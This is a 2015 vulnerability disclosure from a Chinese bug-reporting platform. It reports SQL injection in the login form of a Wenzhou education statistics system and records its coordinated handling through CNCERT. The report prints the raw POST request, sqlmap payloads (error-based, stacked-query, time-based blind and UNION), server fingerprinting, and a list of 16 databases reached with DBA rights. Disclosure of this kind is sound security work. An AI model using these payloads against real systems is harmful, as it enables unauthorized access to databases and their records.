wybug_title: 温州教育网某系统存在SQL注入且权限为DBA涉及16个库
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-09-04：	细节已通知厂商并且等待厂商处理中									2015-09-07：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-09-17：	细节向核心白帽子及相关领域专家公开									2015-09-27：	细节向普通白帽子公开									2015-10-07：	细节向实习白帽子公开									2015-10-22：	细节向公众公开  简要描述： RT 详细说明：  漏洞系统：温州教育信息化统计管理系统
http://**.**.**.**/
漏洞地址：
POST /login_xz1.asp?action=confirm HTTP/1.1Host: **.**.**.**Proxy-Connection: keep-aliveContent-Length: 65Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/login_xz1.aspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDQQBSCCCT=BEOLENCDDMLNAIGIMDKFEMGFpart_bzcode=&R1=V1&part_code=330301&username=admin&password=admin
username参数存在注入
---Parameter: username (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: part_bzcode=&R1=V1&part_code=330301&username=admin' AND 3984=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3984=3984) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(107)+CHAR(113))) AND 'xItC'='xItC&password=admin    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: part_bzcode=&R1=V1&part_code=330301&username=admin';WAITFOR DELAY '0:0:5'--&password=admin    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: part_bzcode=&R1=V1&part_code=330301&username=admin' WAITFOR DELAY '0:0:5'--&password=admin    Type: UNION query    Title: Generic UNION query (NULL) - 20 columns    Payload: part_bzcode=&R1=V1&part_code=330301&username=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113)+CHAR(83)+CHAR(90)+CHAR(84)+CHAR(97)+CHAR(71)+CHAR(72)+CHAR(84)+CHAR(82)+CHAR(104)+CHAR(77)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &password=admin---[13:09:29] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000
   漏洞证明：  数据库：
available databases [16]:[*] edu_domain[*] edu_stat[*] eduExcel[*] edustat2011[*] edutemp[*] InHospital[*] master[*] model[*] msdb[*] MYWORK[*] Northwind[*] pubs[*] pyedu[*] rabfdb[*] schoollx[*] tempdb

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-07 09:00 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给浙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
